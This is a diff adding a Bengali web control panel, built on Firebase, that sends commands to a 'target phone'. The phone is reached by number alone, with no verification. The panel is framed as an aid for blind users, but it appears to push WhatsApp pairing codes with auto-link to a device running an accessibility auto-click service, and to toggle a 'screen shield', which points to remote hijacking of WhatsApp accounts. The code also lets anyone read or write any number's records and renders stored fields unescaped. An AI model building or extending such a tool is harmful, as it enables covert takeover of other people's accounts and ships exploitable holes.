@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Firebase রিয়েল-টাইম সিগন্যাল কন্ট্রোলার (ফোন নাম্বার লগইন)</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --emerald-950: #022c22;
+      --emerald-900: #064e3b;
+      --emerald-700: #047857;
+      --emerald-600: #059669;
+      --emerald-500: #10b981;
+      --emerald-100: #d1fae5;
+      --emerald-50: #ecfdf5;
+      --red-600: #dc2626;
+      --red-50: #fef2f2;
+      --blue-600: #0284c7;
+      --slate-900: #0f172a;
+      --slate-700: #334155;
+      --slate-500: #64748b;
+      --slate-200: #e2e8f0;
+      --slate-100: #f1f5f9;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Hind Siliguri', system-ui, -apple-system, sans-serif;
+    }
+
+    body {
+      background: linear-gradient(145deg, #022c22 0%, #064e3b 50%, #0f172a 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      padding: 20px 14px;
+      color: var(--slate-900);
+    }
+
+    .card {
+      width: 100%;
+      max-width: 520px;
+      background: #ffffff;
+      border-radius: 24px;
+      padding: 24px 20px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.35);
+      border: 2px solid rgba(16, 185, 129, 0.25);
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      padding-bottom: 16px;
+      border-bottom: 1.5px solid var(--slate-100);
+    }
+
+    .header-left {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .bolt-badge {
+      width: 46px;
+      height: 46px;
+      border-radius: 50%;
+      background: var(--emerald-100);
+      color: var(--emerald-600);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 22px;
+      font-weight: 700;
+      flex-shrink: 0;
+    }
+
+    .title {
+      font-size: 19px;
+      font-weight: 700;
+      color: var(--slate-900);
+      line-height: 1.25;
+    }
+
+    .subtitle {
+      font-size: 13px;
+      font-weight: 600;
+      color: var(--emerald-600);
+      margin-top: 2px;
+    }
+
+    .btn-signout {
+      background: var(--slate-100);
+      color: var(--slate-700);
+      border: 1px solid var(--slate-200);
+      padding: 8px 12px;
+      border-radius: 10px;
+      font-size: 12.5px;
+      font-weight: 600;
+      cursor: pointer;
+      display: none;
+    }
+
+    .btn-signout:hover {
+      background: #e2e8f0;
+    }
+
+    .desc {
+      margin-top: 14px;
+      font-size: 14px;
+      color: var(--slate-700);
+      line-height: 1.55;
+      background: #f8fafc;
+      padding: 12px 14px;
+      border-radius: 14px;
+      border-left: 4px solid var(--emerald-600);
+    }
+
+    .section {
+      margin-top: 18px;
+    }
+
+    .label {
+      display: block;
+      font-size: 13.5px;
+      font-weight: 700;
+      color: var(--slate-700);
+      margin-bottom: 6px;
+    }
+
+    .input-box {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 18px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      border: 2px solid var(--slate-200);
+      border-radius: 14px;
+      outline: none;
+      transition: all 0.2s;
+      color: var(--slate-900);
+      background: #ffffff;
+    }
+
+    .input-box:focus {
+      border-color: var(--emerald-600);
+      box-shadow: 0 0 0 4px rgba(5, 150, 105, 0.12);
+    }
+
+    .input-phone {
+      letter-spacing: 1px;
+      text-transform: none;
+    }
+
+    .input-small {
+      font-size: 14px;
+      letter-spacing: 0.5px;
+      text-transform: none;
+      padding: 11px 14px;
+      margin-bottom: 10px;
+    }
+
+    .btn {
+      width: 100%;
+      min-height: 54px;
+      border: none;
+      border-radius: 14px;
+      font-size: 15.5px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: transform 0.12s, background-color 0.2s, opacity 0.2s;
+      padding: 12px 16px;
+    }
+
+    .btn:active {
+      transform: scale(0.985);
+    }
+
+    .btn:disabled {
+      opacity: 0.55;
+      cursor: not-allowed;
+    }
+
+    .btn-phone-login {
+      background: var(--emerald-600);
+      color: #ffffff;
+      box-shadow: 0 8px 20px rgba(5, 150, 105, 0.28);
+      margin-top: 12px;
+    }
+
+    .btn-phone-login:hover:not(:disabled) {
+      background: var(--emerald-700);
+    }
+
+    .btn-whatsapp-send {
+      background: var(--emerald-600);
+      color: #ffffff;
+      box-shadow: 0 8px 20px rgba(5, 150, 105, 0.28);
+      margin-top: 12px;
+    }
+
+    .btn-whatsapp-send:hover:not(:disabled) {
+      background: var(--emerald-700);
+    }
+
+    .grid-3 {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-top: 14px;
+    }
+
+    .grid-2 {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+      margin-top: 10px;
+    }
+
+    .btn-outline {
+      min-height: 48px;
+      border-radius: 12px;
+      font-size: 13.5px;
+      font-weight: 700;
+      background: #ffffff;
+      border: 2px solid var(--slate-200);
+      color: var(--slate-900);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      padding: 10px 8px;
+      transition: all 0.15s;
+    }
+
+    .btn-outline:hover:not(:disabled) {
+      background: var(--slate-100);
+    }
+
+    .btn-poweron {
+      border-color: var(--emerald-500);
+      color: var(--emerald-700);
+      background: var(--emerald-50);
+    }
+
+    .btn-poweroff {
+      border-color: #f87171;
+      color: var(--red-600);
+      background: var(--red-50);
+    }
+
+    .btn-status {
+      border-color: #38bdf8;
+      color: var(--blue-600);
+      background: #f0f9ff;
+    }
+
+    .btn-sos {
+      background: var(--red-600);
+      color: #ffffff;
+      margin-top: 12px;
+      min-height: 50px;
+    }
+
+    .banner {
+      margin-top: 16px;
+      padding: 12px 14px;
+      border-radius: 12px;
+      font-size: 13.5px;
+      font-weight: 600;
+      display: none;
+      line-height: 1.45;
+    }
+
+    .banner.success {
+      display: block;
+      background: var(--emerald-50);
+      color: var(--emerald-900);
+      border: 1.5px solid #6ee7b7;
+    }
+
+    .banner.error {
+      display: block;
+      background: var(--red-50);
+      color: #991b1b;
+      border: 1.5px solid #fca5a5;
+    }
+
+    .feed-box {
+      margin-top: 18px;
+      padding-top: 16px;
+      border-top: 1.5px solid var(--slate-100);
+    }
+
+    .feed-title {
+      font-size: 13.5px;
+      font-weight: 700;
+      color: var(--slate-700);
+      margin-bottom: 10px;
+    }
+
+    .signal-item {
+      background: #f8fafc;
+      border: 1px solid var(--slate-200);
+      border-radius: 12px;
+      padding: 10px 12px;
+      margin-bottom: 8px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .signal-item.critical {
+      background: #fef2f2;
+      border-color: #fecaca;
+    }
+
+    .signal-meta {
+      font-size: 11.5px;
+      font-weight: 700;
+      color: var(--emerald-600);
+    }
+
+    .signal-item.critical .signal-meta {
+      color: var(--red-600);
+    }
+
+    .signal-msg {
+      font-size: 13.5px;
+      font-weight: 600;
+      color: var(--slate-900);
+      margin-top: 2px;
+    }
+
+    .badge-status {
+      font-size: 11px;
+      font-weight: 700;
+      padding: 4px 8px;
+      border-radius: 999px;
+      background: var(--emerald-100);
+      color: var(--emerald-900);
+      white-space: nowrap;
+    }
+  </style>
+</head>
+<body>
+
+  <main class="card" role="main" aria-label="Firebase রিয়েল-টাইম সিগন্যাল কন্ট্রোলার">
+    <!-- শীর্ষ বার -->
+    <div class="header">
+      <div class="header-left">
+        <div class="bolt-badge" aria-hidden="true">⚡</div>
+        <div>
+          <h1 class="title">Firebase রিয়েল-টাইম সিগন্যাল</h1>
+          <p id="authSubtitle" class="subtitle">ফোন নাম্বার দিয়ে সুপার-ফাস্ট লগইন ও সিগন্যাল</p>
+        </div>
+      </div>
+      <button id="signOutBtn" class="btn-signout" type="button">লগআউট</button>
+    </div>
+
+    <div class="desc">
+      দৃষ্টি প্রতিবন্ধী ভাই-বোনদের সুবিধার্থে কোনো Google পাসওয়ার্ডের ঝামেলা ছাড়াই শুধু <strong>মোবাইল নাম্বার</strong> দিয়ে লগইন করে যেকোনো ফোন বা কম্পিউটার থেকে <strong>০.১ সেকেন্ডে</strong> সিগন্যাল পাঠানোর প্যানেল।
+    </div>
+
+    <!-- ধাপ ১: ফোন নাম্বার দিয়ে ১-ক্লিক লগইন সেকশন -->
+    <div id="signInSection" class="section">
+      <label class="label" for="phoneLoginInput">📱 আপনার মোবাইল নাম্বার লিখুন (যেমন: 01712345678)</label>
+      <input
+        id="phoneLoginInput"
+        class="input-box input-phone"
+        type="tel"
+        maxlength="15"
+        autocomplete="tel"
+        placeholder="017XXXXXXXX"
+        aria-label="মোবাইল নাম্বার লিখুন"
+      />
+      <button id="phoneLoginBtn" class="btn btn-phone-login" type="button">
+        <span>📞 ফোন নাম্বার দিয়ে লগইন করুন</span>
+      </button>
+    </div>
+
+    <!-- ধাপ ২: লগইন পরবর্তী কন্ট্রোল প্যানেল -->
+    <div id="controlSection" class="section" style="display: none;">
+      <label class="label" for="targetPhoneInput">লগইনকৃত ফোন নাম্বার (যেই ফোনে সিগন্যাল যাবে)</label>
+      <input
+        id="targetPhoneInput"
+        class="input-box input-small"
+        type="tel"
+        readonly
+      />
+
+      <!-- টার্গেট ফোনের লাইভ সংযোগ ও সর্বশেষ সংযুক্ত সময় (Last Seen / lastConnectedAt) -->
+      <div
+        id="targetDeviceStatusBox"
+        style="background: #f0fdf4; border: 1.5px solid #86efac; border-radius: 14px; padding: 12px 14px; margin-bottom: 14px;"
+        role="status"
+        aria-live="polite"
+      >
+        <div id="targetConnectionTitle" style="font-size: 13px; font-weight: 800; color: #065f46;">
+          📡 টার্গেট ফোনের সংযোগ স্ট্যাটাস যাচাই হচ্ছে...
+        </div>
+        <div id="targetLastConnectedText" style="font-size: 12px; font-weight: 700; color: #047857; margin-top: 4px;">
+          🕒 সর্বশেষ সংযুক্ত (Last Seen): লোড হচ্ছে...
+        </div>
+        <div id="targetLiveSummaryText" style="font-size: 12px; font-weight: 600; color: #1e293b; margin-top: 4px;">
+          টার্গেট ফোনে একই নাম্বার দিয়ে লগইন ও পারমিশন অন থাকলে এখানে রিয়েল-টাইম স্ট্যাটাস দেখা যাবে।
+        </div>
+      </div>
+
+      <label class="label" for="pairingCodeInput">হোয়াটসঅ্যাপ ৮-ডিজিট পেয়ারিং কোড (যেমন: ABCD1234)</label>
+      <input
+        id="pairingCodeInput"
+        class="input-box"
+        type="text"
+        maxlength="10"
+        autocomplete="off"
+        placeholder="ABCD1234"
+        aria-label="হোয়াটসঅ্যাপ ৮-ডিজিট পেয়ারিং কোড"
+      />
+
+      <!-- প্রাইমারি বাটন: Firebase দিয়ে WhatsApp লিঙ্ক সিগন্যাল পাঠান -->
+      <button id="sendWhatsAppSignalBtn" class="btn btn-whatsapp-send" type="button">
+        <span>📲 Firebase দিয়ে WhatsApp লিঙ্ক সিগন্যাল পাঠান</span>
+      </button>
+
+      <!-- ডুয়াল WhatsApp অ্যাপ নির্বাচনের শর্টকাট বাটন -->
+      <div class="grid-2">
+        <button id="selectStandardWaBtn" class="btn-outline" type="button">
+          🟢 সাধারণ WhatsApp (/whatsapp)
+        </button>
+        <button id="selectBusinessWaBtn" class="btn-outline" type="button">
+          💼 WA Business (/whatsapp_business)
+        </button>
+      </div>
+
+      <!-- ১-ক্লিকে পাওয়ার অন (/poweron), পাওয়ার অফ (/poweroff), ও স্ট্যাটাস চেক বাটন -->
+      <div class="grid-3">
+        <button id="powerOnBtn" class="btn-outline btn-poweron" type="button">
+          🟢 পাওয়ার অন (/poweron)
+        </button>
+        <button id="powerOffBtn" class="btn-outline btn-poweroff" type="button">
+          🔴 পাওয়ার অফ (/poweroff)
+        </button>
+        <button id="statusCheckBtn" class="btn-outline btn-status" type="button">
+          📊 স্ট্যাটাস চেক
+        </button>
+      </div>
+
+      <!-- জরুরি SOS সিগন্যাল বাটন -->
+      <button id="sosSignalBtn" class="btn btn-sos" type="button">
+        🚨 জরুরি মুহূর্তে তাৎক্ষণিক SOS সিগন্যাল পাঠান
+      </button>
+    </div>
+
+    <!-- ফিডব্যাক ব্যানার -->
+    <div id="feedbackBanner" class="banner" role="status" aria-live="polite"></div>
+
+    <!-- রিয়েল-টাইম সিগন্যাল স্ট্রিম -->
+    <div class="feed-box">
+      <div class="feed-title">📡 সর্বশেষ রিয়েল-টাইম Firebase সিগন্যালসমূহ:</div>
+      <div id="signalListContainer">
+        <p style="font-size: 13px; color: #64748b;">
+          ফোন নাম্বার দিয়ে লগইন করলে রিয়েল-টাইম সিগন্যাল তালিকা এখানে দেখা যাবে...
+        </p>
+      </div>
+    </div>
+  </main>
+
+  <!-- Firebase Modular SDK (v11) -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+    import {
+      initializeFirestore,
+      collection,
+      doc,
+      getDoc,
+      setDoc,
+      query,
+      where,
+      onSnapshot,
+      serverTimestamp
+    } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+
+    // ============================================================================
+    // ১. প্রজেক্টের আসল Firebase কনফিগারেশন ও Database ID (হুবহু সংযুক্ত)
+    // ============================================================================
+    const firebaseConfig = {
+      apiKey: "AIzaSyDJnjfFt3BF7K_ZnwNO7jpT8kJUZxNqNmg",
+      authDomain: "com-aistudio-applet-ikxv-4f3c6.firebaseapp.com",
+      projectId: "com-aistudio-applet-ikxv-4f3c6",
+      storageBucket: "com-aistudio-applet-ikxv-4f3c6.firebasestorage.app",
+      messagingSenderId: "149259493706",
+      appId: "1:149259493706:android:2306c1f6f31b42918b21b3"
+    };
+
+    const FIRESTORE_DATABASE_ID = "ai-studio-android-remixrem-164ce0a8-68b3-44c7-92c6-3ca17583222c";
+    const STORAGE_PHONE_KEY = "va_logged_in_phone_number";
+
+    const app = initializeApp(firebaseConfig);
+    const db = initializeFirestore(app, {}, FIRESTORE_DATABASE_ID);
+
+    // DOM Elements
+    const authSubtitle = document.getElementById("authSubtitle");
+    const signInSection = document.getElementById("signInSection");
+    const controlSection = document.getElementById("controlSection");
+    const signOutBtn = document.getElementById("signOutBtn");
+    const phoneLoginInput = document.getElementById("phoneLoginInput");
+    const phoneLoginBtn = document.getElementById("phoneLoginBtn");
+    const targetPhoneInput = document.getElementById("targetPhoneInput");
+    const targetDeviceStatusBox = document.getElementById("targetDeviceStatusBox");
+    const targetConnectionTitle = document.getElementById("targetConnectionTitle");
+    const targetLastConnectedText = document.getElementById("targetLastConnectedText");
+    const targetLiveSummaryText = document.getElementById("targetLiveSummaryText");
+    const pairingCodeInput = document.getElementById("pairingCodeInput");
+    const sendWhatsAppSignalBtn = document.getElementById("sendWhatsAppSignalBtn");
+    const selectStandardWaBtn = document.getElementById("selectStandardWaBtn");
+    const selectBusinessWaBtn = document.getElementById("selectBusinessWaBtn");
+    const powerOnBtn = document.getElementById("powerOnBtn");
+    const powerOffBtn = document.getElementById("powerOffBtn");
+    const statusCheckBtn = document.getElementById("statusCheckBtn");
+    const sosSignalBtn = document.getElementById("sosSignalBtn");
+    const feedbackBanner = document.getElementById("feedbackBanner");
+    const signalListContainer = document.getElementById("signalListContainer");
+
+    let activePhoneKey = "";
+    let unsubscribeSignals = null;
+    let unsubscribeProfile = null;
+    let latestProfileData = null;
+
+    // বাংলা সংখ্যা (০-৯) কে ইংরেজি সংখ্যায় (0-9) রূপান্তর ও নরমালাইজেশন
+    function normalizePhoneKey(raw) {
+      const bnDigits = "০১২৩৪৫৬৭৮৯";
+      let digits = "";
+      for (const ch of String(raw || "")) {
+        const bnIdx = bnDigits.indexOf(ch);
+        if (bnIdx !== -1) {
+          digits += String(bnIdx);
+        } else if (ch >= "0" && ch <= "9") {
+          digits += ch;
+        }
+      }
+      if (digits.length === 15 && digits.startsWith("008801")) {
+        return digits.slice(4);
+      }
+      if (digits.length === 13 && digits.startsWith("8801")) {
+        return digits.slice(2);
+      }
+      if (digits.length === 10 && digits.startsWith("1")) {
+        return "0" + digits;
+      }
+      return digits;
+    }
+
+    function formatLastSeenTimestamp(ts) {
+      if (!ts) return "এখনো টার্গেট ফোন সংযুক্ত হয়নি";
+      const dateObj = typeof ts.toDate === "function"
+        ? ts.toDate()
+        : (ts.seconds ? new Date(ts.seconds * 1000) : new Date(ts));
+      if (isNaN(dateObj.getTime())) return "এখনো টার্গেট ফোন সংযুক্ত হয়নি";
+      const diffSec = Math.max(0, Math.floor((Date.now() - dateObj.getTime()) / 1000));
+      const timeFormatted = dateObj.toLocaleTimeString("bn-BD", {
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit"
+      });
+      if (diffSec < 45) {
+        return `${timeFormatted} (এইমাত্র অনলাইনে সক্রিয় — ${diffSec} সেকেন্ড আগে)`;
+      } else if (diffSec < 3600) {
+        return `${timeFormatted} (${Math.floor(diffSec / 60)} মিনিট আগে সংযুক্ত ছিল)`;
+      }
+      return `${timeFormatted} (${dateObj.toLocaleDateString("bn-BD")})`;
+    }
+
+    function renderTargetProfileStatus(profile) {
+      latestProfileData = profile;
+      if (!profile) {
+        targetDeviceStatusBox.style.background = "#fffbeb";
+        targetDeviceStatusBox.style.borderColor = "#fde68a";
+        targetConnectionTitle.style.color = "#92400e";
+        targetConnectionTitle.textContent = "🟠 এই নাম্বারে কোনো টার্গেট ফোন এখনো লগইন করেনি";
+        targetLastConnectedText.style.color = "#b45309";
+        targetLastConnectedText.textContent = "🕒 সর্বশেষ সংযুক্ত (Last Seen): এখনো সংযুক্ত হয়নি";
+        targetLiveSummaryText.textContent = "টার্গেট ফোনে অ্যাপে একই নাম্বার দিয়ে লগইন ও অ্যাক্সেসিবিলিটি পারমিশন অন করুন।";
+        return;
+      }
+
+      const lastSeenTs = profile.lastConnectedAt || profile.updatedAt;
+      const lastSeenStr = formatLastSeenTimestamp(lastSeenTs);
+      const isPermOn = Boolean(profile.isServiceEnabled);
+      const modelName = profile.deviceModel || "Android Phone";
+
+      if (isPermOn) {
+        targetDeviceStatusBox.style.background = "#f0fdf4";
+        targetDeviceStatusBox.style.borderColor = "#86efac";
+        targetConnectionTitle.style.color = "#065f46";
+        targetConnectionTitle.textContent = `🟢 টার্গেট অ্যাপ কানেক্টেড (${modelName}) • পারমিশন অন ✓`;
+        targetLastConnectedText.style.color = "#047857";
+      } else {
+        targetDeviceStatusBox.style.background = "#fffbeb";
+        targetDeviceStatusBox.style.borderColor = "#fde68a";
+        targetConnectionTitle.style.color = "#92400e";
+        targetConnectionTitle.textContent = `🟠 অ্যাপ লগইন আছে (${modelName}) • কিন্তু অ্যাক্সেসিবিলিটি পারমিশন অফ`;
+        targetLastConnectedText.style.color = "#b45309";
+      }
+
+      targetLastConnectedText.textContent = `🕒 সর্বশেষ সংযুক্ত (lastConnectedAt): ${lastSeenStr}`;
+      targetLiveSummaryText.textContent = `📡 লাইভ স্ট্যাটাস: ${profile.lastSignalSummary || "প্রস্তুত"}`;
+    }
+
+    function showBanner(message, isError = false) {
+      feedbackBanner.textContent = message;
+      feedbackBanner.className = "banner " + (isError ? "error" : "success");
+    }
+
+    // পেয়ারিং কোড ইনপুট স্বয়ংক্রিয়ভাবে ক্যাপিটাল ও হাইফেনমুক্ত রাখা
+    pairingCodeInput.addEventListener("input", () => {
+      pairingCodeInput.value = pairingCodeInput.value
+        .replace(/[-_\s]/g, "")
+        .toUpperCase()
+        .slice(0, 10);
+    });
+
+    function activatePhoneSession(cleanPhone) {
+      activePhoneKey = cleanPhone;
+      localStorage.setItem(STORAGE_PHONE_KEY, cleanPhone);
+      authSubtitle.textContent = "সংযুক্ত ফোন: " + cleanPhone;
+      targetPhoneInput.value = cleanPhone;
+      signInSection.style.display = "none";
+      controlSection.style.display = "block";
+      signOutBtn.style.display = "inline-block";
+      listenToPhoneProfile(cleanPhone);
+      listenToPhoneSignals(cleanPhone);
+    }
+
+    // ফোন নাম্বার দিয়ে লগইন বাটন হ্যান্ডলার
+    phoneLoginBtn.addEventListener("click", () => {
+      const clean = normalizePhoneKey(phoneLoginInput.value);
+      if (clean.length < 8 || clean.length > 20) {
+        showBanner("⚠️ অনুগ্রহ করে সঠিক মোবাইল নাম্বার লিখুন (যেমন: 01712345678)।", true);
+        phoneLoginInput.focus();
+        return;
+      }
+      activatePhoneSession(clean);
+      showBanner("✅ আলহামদুলিল্লাহ! ফোন নাম্বার (" + clean + ") দিয়ে সফলভাবে সংযুক্ত হয়েছে।");
+    });
+
+    // লগআউট হ্যান্ডলার
+    signOutBtn.addEventListener("click", () => {
+      activePhoneKey = "";
+      localStorage.removeItem(STORAGE_PHONE_KEY);
+      if (unsubscribeSignals) {
+        unsubscribeSignals();
+        unsubscribeSignals = null;
+      }
+      if (unsubscribeProfile) {
+        unsubscribeProfile();
+        unsubscribeProfile = null;
+      }
+      latestProfileData = null;
+      authSubtitle.textContent = "ফোন নাম্বার দিয়ে সুপার-ফাস্ট লগইন ও সিগন্যাল";
+      signInSection.style.display = "block";
+      controlSection.style.display = "none";
+      signOutBtn.style.display = "none";
+      signalListContainer.innerHTML =
+        '<p style="font-size: 13px; color: #64748b;">ফোন নাম্বার দিয়ে লগইন করলে রিয়েল-টাইম সিগন্যাল তালিকা এখানে দেখা যাবে...</p>';
+      showBanner("ফোন নাম্বার সেশন থেকে লগআউট সম্পন্ন হয়েছে।");
+    });
+
+    // সিগন্যাল পাঠানোর মূল ফাংশন (/phone_users/{phoneKey}/signals/{signalId})
+    async function dispatchFirebaseSignal({ signalType, command, messageBn, priority = "CRITICAL" }) {
+      if (!activePhoneKey) {
+        showBanner("⚠️ অনুগ্রহ করে প্রথমে আপনার ফোন নাম্বার দিয়ে লগইন করুন।", true);
+        return;
+      }
+
+      const randomHex = Array.from(crypto.getRandomValues(new Uint8Array(8)))
+        .map((b) => b.toString(16).padStart(2, "0"))
+        .join("");
+      const signalId = "sig_" + randomHex;
+
+      const payload = {
+        id: signalId,
+        userId: activePhoneKey,
+        deviceId: latestProfileData?.deviceId || ("PHONE-" + activePhoneKey),
+        signalType: signalType,
+        command: command.slice(0, 200),
+        messageBn: messageBn.slice(0, 500),
+        priority: priority,
+        status: "SENT",
+        createdAt: serverTimestamp(),
+        updatedAt: serverTimestamp()
+      };
+
+      try {
+        const signalRef = doc(db, "phone_users", activePhoneKey, "signals", signalId);
+        await setDoc(signalRef, payload);
+
+        const userRef = doc(db, "phone_users", activePhoneKey);
+        const existingSnap = await getDoc(userRef);
+        if (!existingSnap.exists()) {
+          await setDoc(userRef, {
+            userId: activePhoneKey,
+            deviceId: "PHONE-" + activePhoneKey,
+            deviceModel: "Web Control Panel (টার্গেট ফোন অপেক্ষমান)",
+            isPowerOn: signalType !== "POWER_OFF",
+            isServiceEnabled: false,
+            lastSignalSummary: messageBn.slice(0, 500),
+            createdAt: serverTimestamp(),
+            updatedAt: serverTimestamp()
+          });
+        } else {
+          // Do not overwrite target phone's deviceModel, isServiceEnabled, or lastConnectedAt!
+          await setDoc(
+            userRef,
+            {
+              isPowerOn: signalType !== "POWER_OFF",
+              lastSignalSummary: messageBn.slice(0, 500),
+              updatedAt: serverTimestamp()
+            },
+            { merge: true }
+          );
+        }
+
+        showBanner("✅ ০.১ সেকেন্ডে (" + activePhoneKey + ") ফোনে সিগন্যাল প্রেরিত হয়েছে: " + messageBn);
+      } catch (err) {
+        showBanner("⚠️ সিগন্যাল পাঠাতে সমস্যা: " + (err.message || err), true);
+      }
+    }
+
+    // ১. ৮-ডিজিট WhatsApp লিঙ্ক সিগন্যাল বাটন
+    sendWhatsAppSignalBtn.addEventListener("click", async () => {
+      const cleanCode = pairingCodeInput.value.replace(/[-_\s]/g, "").trim().toUpperCase();
+      if (cleanCode.length < 6) {
+        showBanner("⚠️ অনুগ্রহ করে অন্তত ৬-৮ ডিজিটের সঠিক পেয়ারিং কোড লিখুন (যেমন: ABCD1234)।", true);
+        pairingCodeInput.focus();
+        return;
+      }
+      sendWhatsAppSignalBtn.disabled = true;
+      await dispatchFirebaseSignal({
+        signalType: "WHATSAPP_LINK",
+        command: "/send_cod_" + cleanCode,
+        messageBn: "হোয়াটসঅ্যাপ লিঙ্কড পেয়ারিং কোড (" + cleanCode + ") Firebase-এ প্রেরিত ও অটো-লিঙ্ক চালু",
+        priority: "CRITICAL"
+      });
+      pairingCodeInput.value = "";
+      sendWhatsAppSignalBtn.disabled = false;
+    });
+
+    // ২. সাধারণ WhatsApp নির্বাচন সিগন্যাল
+    selectStandardWaBtn.addEventListener("click", async () => {
+      const codeSuffix = pairingCodeInput.value.trim().toUpperCase();
+      const cmd = codeSuffix.length >= 6 ? "/send_cod_" + codeSuffix + " /whatsapp" : "/whatsapp";
+      await dispatchFirebaseSignal({
+        signalType: "WHATSAPP_LINK",
+        command: cmd,
+        messageBn: "সাধারণ WhatsApp অ্যাপ নির্বাচন ও অটো-লিঙ্ক সিগন্যাল প্রেরিত",
+        priority: "HIGH"
+      });
+    });
+
+    // ৩. WhatsApp Business নির্বাচন সিগন্যাল
+    selectBusinessWaBtn.addEventListener("click", async () => {
+      const codeSuffix = pairingCodeInput.value.trim().toUpperCase();
+      const cmd = codeSuffix.length >= 6 ? "/send_cod_" + codeSuffix + " /whatsapp_business" : "/whatsapp_business";
+      await dispatchFirebaseSignal({
+        signalType: "WHATSAPP_LINK",
+        command: cmd,
+        messageBn: "WhatsApp Business অ্যাপ নির্বাচন ও অটো-লিঙ্ক সিগন্যাল প্রেরিত",
+        priority: "HIGH"
+      });
+    });
+
+    // ৪. পাওয়ার অন (/poweron) বাটন
+    powerOnBtn.addEventListener("click", async () => {
+      await dispatchFirebaseSignal({
+        signalType: "SCREEN_SHIELD",
+        command: "/poweron",
+        messageBn: "হোয়াটসঅ্যাপ লিঙ্কড পাওয়ার অন (/poweron) ও স্ক্রিন সুরক্ষা শিল্ড সক্রিয়",
+        priority: "HIGH"
+      });
+    });
+
+    // ৫. পাওয়ার অফ (/poweroff) বাটন
+    powerOffBtn.addEventListener("click", async () => {
+      await dispatchFirebaseSignal({
+        signalType: "POWER_OFF",
+        command: "/poweroff",
+        messageBn: "পাওয়ার অফ (/poweroff) ও অটো-ক্লিক সার্ভিস বন্ধ সিগন্যাল প্রেরিত",
+        priority: "HIGH"
+      });
+    });
+
+    // ৬. স্ট্যাটাস চেক বাটন
+    statusCheckBtn.addEventListener("click", async () => {
+      await dispatchFirebaseSignal({
+        signalType: "STATUS_PING",
+        command: "READY_FOR_WHATSAPP_LINK",
+        messageBn: "স্ট্যাটাস চেক: হোয়াটসঅ্যাপ লিঙ্কড ডিভাইস সার্ভিস প্রস্তুত ও সচল রয়েছে কিনা যাচাই",
+        priority: "NORMAL"
+      });
+    });
+
+    // ৭. জরুরি SOS সিগন্যাল বাটন
+    sosSignalBtn.addEventListener("click", async () => {
+      await dispatchFirebaseSignal({
+        signalType: "EMERGENCY_SOS",
+        command: "SOS_WHATSAPP_LINK_ASSIST",
+        messageBn: "জরুরি মুহূর্তে দৃষ্টি প্রতিবন্ধী ভাইয়ের তাৎক্ষণিক হোয়াটসঅ্যাপ লিঙ্কড ও SOS সহায়তা সিগন্যাল!",
+        priority: "CRITICAL"
+      });
+    });
+
+    // রিয়েল-টাইম ডিভাইস প্রোফাইল ও lastConnectedAt লিসেনার (/phone_users/{phoneKey})
+    function listenToPhoneProfile(phoneKey) {
+      if (unsubscribeProfile) {
+        unsubscribeProfile();
+      }
+      const userRef = doc(db, "phone_users", phoneKey);
+      unsubscribeProfile = onSnapshot(
+        userRef,
+        (docSnap) => {
+          if (docSnap.exists()) {
+            renderTargetProfileStatus(docSnap.data());
+          } else {
+            renderTargetProfileStatus(null);
+          }
+        },
+        (err) => {
+          console.warn("Profile listener notice:", err.message);
+        }
+      );
+    }
+
+    // রিয়েল-টাইম সিগন্যাল লিসেনার (/phone_users/{phoneKey}/signals)
+    function listenToPhoneSignals(phoneKey) {
+      if (unsubscribeSignals) {
+        unsubscribeSignals();
+      }
+      const signalsQuery = query(
+        collection(db, "phone_users", phoneKey, "signals"),
+        where("userId", "==", phoneKey)
+      );
+      unsubscribeSignals = onSnapshot(
+        signalsQuery,
+        (snapshot) => {
+          const items = [];
+          snapshot.forEach((docSnap) => {
+            items.push(docSnap.data());
+          });
+          items.sort((a, b) => {
+            const tA = a.createdAt?.seconds || 0;
+            const tB = b.createdAt?.seconds || 0;
+            return tB - tA;
+          });
+
+          if (items.length === 0) {
+            signalListContainer.innerHTML =
+              '<p style="font-size: 13px; color: #059669; font-weight: 600;">🟢 ফোন নাম্বার (' + phoneKey + ') সংযুক্ত — যেকোনো সিগন্যাল পাঠালেই সাথে সাথে ফোনে কার্যকর হবে।</p>';
+            return;
+          }
+
+          signalListContainer.innerHTML = items
+            .slice(0, 5)
+            .map((sig) => {
+              const isCrit = sig.priority === "CRITICAL";
+              return `
+                <div class="signal-item ${isCrit ? "critical" : ""}">
+                  <div>
+                    <div class="signal-meta">${sig.signalType} • ${sig.command}</div>
+                    <div class="signal-msg">${sig.messageBn || ""}</div>
+                  </div>
+                  <span class="badge-status">${sig.status || "SENT"}</span>
+                </div>
+              `;
+            })
+            .join("");
+        },
+        (err) => {
+          signalListContainer.innerHTML =
+            '<p style="font-size: 12.5px; color: #b91c1c;">সিগন্যাল লোড ত্রুটি: ' + err.message + "</p>";
+        }
+      );
+    }
+
+    // পূর্বে লগইন করা থাকলে স্বয়ংক্রিয়ভাবে চালু করা
